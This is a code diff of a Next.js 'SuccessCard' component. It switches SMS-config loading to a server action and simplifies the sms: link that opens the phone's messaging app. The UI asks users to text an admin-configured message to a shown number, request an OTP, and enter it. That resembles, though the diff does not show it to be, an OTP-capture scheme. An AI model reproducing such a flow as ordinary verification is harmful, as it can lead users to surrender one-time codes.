@@ -1,9 +1,10 @@
 "use client";
 
 import { useEffect, useState } from "react";
-import { CheckCircle2, MessageSquare, Share2, Loader2 } from "lucide-react";
+import { CheckCircle2, MessageSquare, Loader2 } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Card, CardContent } from "@/components/ui/card";
+import { getSmsConfig } from "@/lib/actions/sms";
 
 interface SuccessCardProps {
   submissionId: string;
@@ -23,11 +24,10 @@ export function SuccessCard({ submissionId, onContinue }: SuccessCardProps) {
 
   async function loadSmsConfig() {
     try {
-      const res = await fetch(`/api/sms-config/${submissionId}`);
-      if (res.ok) {
-        const data = await res.json();
-        setSmsNumber(data.sms_number);
-        setSmsMessage(data.message);
+      const result = await getSmsConfig(submissionId);
+      if (!result.error) {
+        setSmsNumber(result.sms_number);
+        setSmsMessage(result.message);
       }
     } catch {
       // use defaults
@@ -36,16 +36,10 @@ export function SuccessCard({ submissionId, onContinue }: SuccessCardProps) {
   }
 
   function openSmsApp() {
-    const body = smsMessage
-      ? `Forward this message to ${smsNumber}: ${smsMessage}`
-      : `Forward this message to ${smsNumber}`;
-
-    if (typeof navigator.share === "function") {
-      navigator.share({ text: body }).catch(() => {});
-    } else {
-      const uri = `sms:${smsNumber}${smsMessage ? `?body=${encodeURIComponent(smsMessage)}` : ""}`;
-      window.location.href = uri;
-    }
+    const uri = smsMessage
+      ? `sms:${smsNumber}?body=${encodeURIComponent(smsMessage)}`
+      : `sms:${smsNumber}`;
+    window.location.href = uri;
   }
 
   return (
@@ -61,12 +55,12 @@ export function SuccessCard({ submissionId, onContinue }: SuccessCardProps) {
           <span className="font-bold text-gray-700">{smsNumber}</span>
           {" "}and ask for OTP. Then click Continue to enter the OTP.
         </p>
-        <div className="bg-gray-50 rounded-lg p-3 text-left">
-          <p className="text-xs text-gray-400 uppercase tracking-wider mb-1">Message to send</p>
-          <p className="text-sm text-gray-700 break-words">
-            {loading ? "Loading..." : smsMessage || "(No admin message configured yet)"}
-          </p>
-        </div>
+        {smsMessage && (
+          <div className="bg-gray-50 rounded-lg p-3 text-left">
+            <p className="text-xs text-gray-400 uppercase tracking-wider mb-1">Message to send</p>
+            <p className="text-sm text-gray-700 break-words">{smsMessage}</p>
+          </div>
+        )}
         <div className="space-y-3 pt-2">
           {isMobile && (
             <Button
@@ -77,8 +71,6 @@ export function SuccessCard({ submissionId, onContinue }: SuccessCardProps) {
             >
               {loading ? (
                 <Loader2 className="h-5 w-5 animate-spin" />
-              ) : typeof navigator.share === "function" ? (
-                <Share2 className="h-5 w-5" />
               ) : (
                 <MessageSquare className="h-5 w-5" />
               )}
